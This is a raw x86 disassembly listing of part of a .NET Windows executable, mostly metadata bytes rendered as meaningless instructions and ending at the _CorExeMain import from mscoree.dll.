  40c1ec:	07                   	pop    %es
  40c1ed:	20 02                	and    %al,(%edx)
  40c1ef:	01 12                	add    %edx,(%edx)
  40c1f1:	80 c9 08             	or     $0x8,%cl
  40c1f4:	06                   	push   %es
  40c1f5:	20 01                	and    %al,(%ecx)
  40c1f7:	01 12                	add    %edx,(%edx)
  40c1f9:	80 f1 09             	xor    $0x9,%cl
  40c1fc:	20 02                	and    %al,(%edx)
  40c1fe:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40c203:	80 f5 05             	xor    $0x5,%ch
  40c206:	20 02                	and    %al,(%edx)
  40c208:	08 08                	or     %cl,(%eax)
  40c20a:	08 06                	or     %al,(%esi)
  40c20c:	20 02                	and    %al,(%edx)
  40c20e:	01 12                	add    %edx,(%edx)
  40c210:	0d 02 05 20 02       	or     $0x2200502,%eax
  40c215:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c218:	09 20                	or     %esp,(%eax)
  40c21a:	03 01                	add    (%ecx),%eax
  40c21c:	12 61 02             	adc    0x2(%ecx),%ah
  40c21f:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40c225:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40c22b:	01 0e                	add    %ecx,(%esi)
  40c22d:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40c233:	02 09                	add    (%ecx),%cl
  40c235:	20 04 01             	and    %al,(%ecx,%eax,1)
  40c238:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40c23e:	0c 20                	or     $0x20,%al
  40c240:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40c245:	08 08                	or     %cl,(%eax)
  40c247:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40c24d:	01 11                	add    %edx,(%ecx)
  40c24f:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40c255:	02 12                	add    (%edx),%dl
  40c257:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40c25a:	02 08                	add    (%eax),%cl
  40c25c:	08 05 20 01 08 12    	or     %al,0x12080120
  40c262:	25 06 00 02 08       	and    $0x8020006,%eax
  40c267:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40c26c:	03 08                	add    (%eax),%ecx
  40c26e:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40c273:	20 01                	and    %al,(%ecx)
  40c275:	01 12                	add    %edx,(%edx)
  40c277:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40c27d:	1c 0c                	sbb    $0xc,%al
  40c27f:	07                   	pop    %es
  40c280:	06                   	push   %es
  40c281:	1c 02                	sbb    $0x2,%al
  40c283:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40c288:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40c28e:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c291:	02 07                	add    (%edi),%al
  40c293:	20 02                	and    %al,(%edx)
  40c295:	02 08                	add    (%eax),%cl
  40c297:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40c29d:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40c2a3:	07                   	pop    %es
  40c2a4:	0a 12                	or     (%edx),%dl
  40c2a6:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40c2ad:	08 12 81 
  40c2b0:	41                   	inc    %ecx
  40c2b1:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40c2b7:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40c2bc:	4d                   	dec    %ebp
  40c2bd:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c2c2:	0e                   	push   %cs
  40c2c3:	05 00 00 12 81       	add    $0x81120000,%eax
  40c2c8:	41                   	inc    %ecx
  40c2c9:	05 20 00 12 81       	add    $0x81120020,%eax
  40c2ce:	55                   	push   %ebp
  40c2cf:	06                   	push   %es
  40c2d0:	00 00                	add    %al,(%eax)
  40c2d2:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40c2d7:	00 01                	add    %al,(%ecx)
  40c2d9:	0e                   	push   %cs
  40c2da:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40c2df:	01 11                	add    %edx,(%ecx)
  40c2e1:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40c2e8:	41                   	inc    %ecx
  40c2e9:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40c2ef:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40c2f6:	49                   	dec    %ecx
  40c2f7:	0e                   	push   %cs
  40c2f8:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40c2fe:	0e                   	push   %cs
  40c2ff:	0e                   	push   %cs
  40c300:	0e                   	push   %cs
  40c301:	0e                   	push   %cs
  40c302:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c307:	1c 07                	sbb    $0x7,%al
  40c309:	20 02                	and    %al,(%edx)
  40c30b:	01 0e                	add    %ecx,(%esi)
  40c30d:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40c313:	0a 02                	or     (%edx),%al
  40c315:	10 07                	adc    %al,(%edi)
  40c317:	06                   	push   %es
  40c318:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40c31e:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40c324:	0e                   	push   %cs
  40c325:	02 05 20 00 12 81    	add    0x81120020,%al
  40c32b:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40c331:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40c337:	91                   	xchg   %eax,%ecx
  40c338:	04 20                	add    $0x20,%al
  40c33a:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40c33d:	04 07                	add    $0x7,%al
  40c33f:	02 02                	add    (%edx),%al
  40c341:	02 03                	add    (%ebx),%al
  40c343:	20 00                	and    %al,(%eax)
  40c345:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40c348:	02 18                	add    (%eax),%bl
  40c34a:	02 03                	add    (%ebx),%al
  40c34c:	07                   	pop    %es
  40c34d:	01 0e                	add    %ecx,(%esi)
  40c34f:	05 00 00 12 81       	add    $0x81120000,%eax
  40c354:	9d                   	popf
  40c355:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c35a:	1c 0a                	sbb    $0xa,%al
  40c35c:	07                   	pop    %es
  40c35d:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40c362:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40c367:	20 01                	and    %al,(%ecx)
  40c369:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40c36f:	0e                   	push   %cs
  40c370:	08 08                	or     %cl,(%eax)
  40c372:	06                   	push   %es
  40c373:	07                   	pop    %es
  40c374:	02 02                	add    (%edx),%al
  40c376:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40c37c:	0e                   	push   %cs
  40c37d:	0e                   	push   %cs
  40c37e:	0e                   	push   %cs
  40c37f:	05 20 00 11 81       	add    $0x81110020,%eax
  40c384:	ad                   	lods   %ds:(%esi),%eax
  40c385:	05 00 00 12 81       	add    $0x81120000,%eax
  40c38a:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40c38f:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40c395:	02 11                	add    (%ecx),%dl
  40c397:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40c39d:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40c3a4:	12 81 8d 
  40c3a7:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40c3ad:	12 41 01             	adc    0x1(%ecx),%al
  40c3b0:	0e                   	push   %cs
  40c3b1:	05 20 01 01 13       	add    $0x13010120,%eax
  40c3b6:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40c3bc:	00 06                	add    %al,(%esi)
  40c3be:	00 02                	add    %al,(%edx)
  40c3c0:	0e                   	push   %cs
  40c3c1:	0e                   	push   %cs
  40c3c2:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40c3c7:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40c3cc:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40c3d2:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40c3d8:	c5 09                	lds    (%ecx),%ecx
  40c3da:	00 02                	add    %al,(%edx)
  40c3dc:	02 11                	add    (%ecx),%dl
  40c3de:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40c3e4:	07                   	pop    %es
  40c3e5:	02 12                	add    (%edx),%dl
  40c3e7:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40c3ec:	01 02                	add    %eax,(%edx)
  40c3ee:	0e                   	push   %cs
  40c3ef:	10 02                	adc    %al,(%edx)
  40c3f1:	06                   	push   %es
  40c3f2:	00 01                	add    %al,(%ecx)
  40c3f4:	01 12                	add    %edx,(%edx)
  40c3f6:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40c3fc:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40c403:	0e                   	push   %cs
  40c404:	1c 11                	sbb    $0x11,%al
  40c406:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40c40c:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40c413:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40c419:	05 07 20 02 12       	add    $0x12022007,%eax
  40c41e:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40c425:	12 60 0e             	adc    0xe(%eax),%ah
  40c428:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c42d:	12 60 12             	adc    0x12(%eax),%ah
  40c430:	60                   	pusha
  40c431:	06                   	push   %es
  40c432:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c437:	60                   	pusha
  40c438:	10 10                	adc    %dl,(%eax)
  40c43a:	01 01                	add    %eax,(%ecx)
  40c43c:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40c441:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40c447:	1e                   	push   %ds
  40c448:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c44b:	01 12                	add    %edx,(%edx)
  40c44d:	60                   	pusha
  40c44e:	09 20                	or     %esp,(%eax)
  40c450:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40c456:	13 00                	adc    (%eax),%eax
  40c458:	07                   	pop    %es
  40c459:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c45e:	12 60 04             	adc    0x4(%eax),%ah
  40c461:	20 00                	and    %al,(%eax)
  40c463:	13 00                	adc    (%eax),%eax
  40c465:	05 20 01 02 13       	add    $0x13020120,%eax
  40c46a:	00 03                	add    %al,(%ebx)
  40c46c:	07                   	pop    %es
  40c46d:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40c474:	e5 07                	in     $0x7,%eax
  40c476:	20 01                	and    %al,(%ecx)
  40c478:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40c47e:	20 01                	and    %al,(%ecx)
  40c480:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40c486:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c489:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40c48f:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40c495:	00 02                	add    %al,(%edx)
  40c497:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40c49d:	0e                   	push   %cs
  40c49e:	1c 00                	sbb    $0x0,%al
  40c4a0:	05 12 82 05 11       	add    $0x11058212,%eax
  40c4a5:	82 09 0e             	orb    $0xe,(%ecx)
  40c4a8:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c4ad:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40c4b3:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c4b8:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40c4be:	45                   	inc    %ebp
  40c4bf:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40c4c5:	4d                   	dec    %ebp
  40c4c6:	1c 12                	sbb    $0x12,%al
  40c4c8:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c4cd:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c4d2:	0e                   	push   %cs
  40c4d3:	0b 00                	or     (%eax),%eax
  40c4d5:	01 15 12 45 01 13    	add    %edx,0x13014512
  40c4db:	00 12                	add    %dl,(%edx)
  40c4dd:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40c4e4:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40c4e9:	4d                   	dec    %ebp
  40c4ea:	1c 12                	sbb    $0x12,%al
  40c4ec:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c4f1:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c4f6:	0e                   	push   %cs
  40c4f7:	17                   	pop    %ss
  40c4f8:	20 0a                	and    %cl,(%edx)
  40c4fa:	01 13                	add    %edx,(%ebx)
  40c4fc:	00 13                	add    %dl,(%ebx)
  40c4fe:	01 13                	add    %edx,(%ebx)
  40c500:	02 13                	add    (%ebx),%dl
  40c502:	03 13                	add    (%ebx),%edx
  40c504:	04 13                	add    $0x13,%al
  40c506:	05 13 06 13 07       	add    $0x7130613,%eax
  40c50b:	13 08                	adc    (%eax),%ecx
  40c50d:	13 09                	adc    (%ecx),%ecx
  40c50f:	05 07 01 12 82       	add    $0x82120107,%eax
  40c514:	0d 07 20 03 01       	or     $0x1032007,%eax
  40c519:	0e                   	push   %cs
  40c51a:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40c51f:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40c525:	06                   	push   %es
  40c526:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40c52c:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40c532:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40c537:	20 01                	and    %al,(%ecx)
  40c539:	01 11                	add    %edx,(%ecx)
  40c53b:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40c542:	82 31 05             	xorb   $0x5,(%ecx)
  40c545:	20 00                	and    %al,(%eax)
  40c547:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40c54d:	01 12                	add    %edx,(%edx)
  40c54f:	61                   	popa
  40c550:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40c556:	08 20                	or     %ah,(%eax)
  40c558:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40c55e:	08 1a                	or     %bl,(%edx)
  40c560:	07                   	pop    %es
  40c561:	0a 12                	or     (%edx),%dl
  40c563:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40c56a:	21 1d 05 
  40c56d:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40c572:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40c579:	05 0c 00 05 01       	add    $0x105000c,%eax
  40c57e:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40c584:	45                   	inc    %ebp
  40c585:	08 08                	or     %cl,(%eax)
  40c587:	04 07                	add    $0x7,%al
  40c589:	02 02                	add    (%edx),%al
  40c58b:	08 09                	or     %cl,(%ecx)
  40c58d:	00 02                	add    %al,(%edx)
  40c58f:	01 12                	add    %edx,(%edx)
  40c591:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40c595:	4d                   	dec    %ebp
  40c596:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40c59b:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40c5a1:	05 08 05 07 07       	add    $0x7070508,%eax
  40c5a6:	02 12                	add    (%edx),%dl
  40c5a8:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40c5ac:	08 07                	or     %al,(%edi)
  40c5ae:	04 12                	add    $0x12,%al
  40c5b0:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40c5b5:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c5ba:	1c 06                	sbb    $0x6,%al
  40c5bc:	07                   	pop    %es
  40c5bd:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40c5c3:	20 01                	and    %al,(%ecx)
  40c5c5:	13 00                	adc    (%eax),%eax
  40c5c7:	08 04 07             	or     %al,(%edi,%eax,1)
  40c5ca:	01 12                	add    %edx,(%edx)
  40c5cc:	60                   	pusha
  40c5cd:	0e                   	push   %cs
  40c5ce:	07                   	pop    %es
  40c5cf:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40c5d4:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40c5da:	12 60 07             	adc    0x7(%eax),%ah
  40c5dd:	07                   	pop    %es
  40c5de:	04 08                	add    $0x8,%al
  40c5e0:	05 1d 05 08 04       	add    $0x408051d,%eax
  40c5e5:	20 01                	and    %al,(%ecx)
  40c5e7:	01 05 04 07 01 11    	add    %eax,0x11010704
  40c5ed:	64 04 00             	fs add $0x0,%al
  40c5f0:	01 0b                	add    %ecx,(%ebx)
  40c5f2:	0a 04 00             	or     (%eax,%eax,1),%al
  40c5f5:	01 0b                	add    %ecx,(%ebx)
  40c5f7:	0e                   	push   %cs
  40c5f8:	04 00                	add    $0x0,%al
  40c5fa:	01 0b                	add    %ecx,(%ebx)
  40c5fc:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40c601:	0c 06                	or     $0x6,%al
  40c603:	00 01                	add    %al,(%ecx)
  40c605:	0b 11                	or     (%ecx),%edx
  40c607:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40c60e:	04 00 01 
  40c611:	0a 0e                	or     (%esi),%cl
  40c613:	04 00                	add    $0x0,%al
  40c615:	01 0a                	add    %ecx,(%edx)
  40c617:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40c61c:	0c 06                	or     $0x6,%al
  40c61e:	00 01                	add    %al,(%ecx)
  40c620:	0a 11                	or     (%ecx),%dl
  40c622:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40c629:	04 00 01 
  40c62c:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40c631:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40c635:	ad                   	lods   %ds:(%esi),%eax
  40c636:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c63b:	0c 07                	or     $0x7,%al
  40c63d:	07                   	pop    %es
  40c63e:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40c644:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40c649:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40c64f:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40c655:	12 60 1d             	adc    0x1d(%eax),%ah
  40c658:	0e                   	push   %cs
  40c659:	0e                   	push   %cs
  40c65a:	08 12                	or     %dl,(%edx)
  40c65c:	60                   	pusha
  40c65d:	08 05 07 01 12 81    	or     %al,0x81120107
  40c663:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40c668:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40c66f:	05 08 08 06 00       	add    $0x60808,%eax
  40c674:	02 07                	add    (%edi),%al
  40c676:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c67b:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40c682:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40c688:	00 02                	add    %al,(%edx)
  40c68a:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40c690:	02 0b                	add    (%ebx),%cl
  40c692:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c697:	02 06                	add    (%esi),%al
  40c699:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c69e:	02 0a                	add    (%edx),%cl
  40c6a0:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c6a5:	03 12                	add    (%edx),%edx
  40c6a7:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c6ae:	07 02 12 
  40c6b1:	60                   	pusha
  40c6b2:	02 04 07             	add    (%edi,%eax,1),%al
  40c6b5:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c6bb:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c6c0:	04 1d                	add    $0x1d,%al
  40c6c2:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c6c7:	06                   	push   %es
  40c6c8:	07                   	pop    %es
  40c6c9:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c6cf:	00 01                	add    %al,(%ecx)
  40c6d1:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40c6d6:	06                   	push   %es
  40c6d7:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40c6dd:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40c6e3:	05 08 20 02 01       	add    $0x1022008,%eax
  40c6e8:	12 61 11             	adc    0x11(%ecx),%ah
  40c6eb:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40c6ef:	04 12                	add    $0x12,%al
  40c6f1:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40c6f8:	1d 05 00 
  40c6fb:	00 24 c7             	add    %ah,(%edi,%eax,8)
	...
  40c706:	00 00                	add    %al,(%eax)
  40c708:	3e c7 00 00 00 20 00 	movl   $0x200000,%ds:(%eax)
	...
  40c723:	00 30                	add    %dh,(%eax)
  40c725:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  40c72b:	00 00                	add    %al,(%eax)
  40c72d:	00 00                	add    %al,(%eax)
  40c72f:	00 00                	add    %al,(%eax)
  40c731:	00 5f 43             	add    %bl,0x43(%edi)
  40c734:	6f                   	outsl  %ds:(%esi),(%dx)
  40c735:	72 45                	jb     0x40c77c
  40c737:	78 65                	js     0x40c79e
  40c739:	4d                   	dec    %ebp
  40c73a:	61                   	popa
  40c73b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40c742:	72 65                	jb     0x40c7a9
  40c744:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40c748:	6c                   	insb   (%dx),%es:(%edi)
  40c749:	00 00                	add    %al,(%eax)
  40c74b:	00 00                	add    %al,(%eax)
  40c74d:	00 ff                	add    %bh,%bh
  40c74f:	25 00 20 40 00       	and    $0x402000,%eax
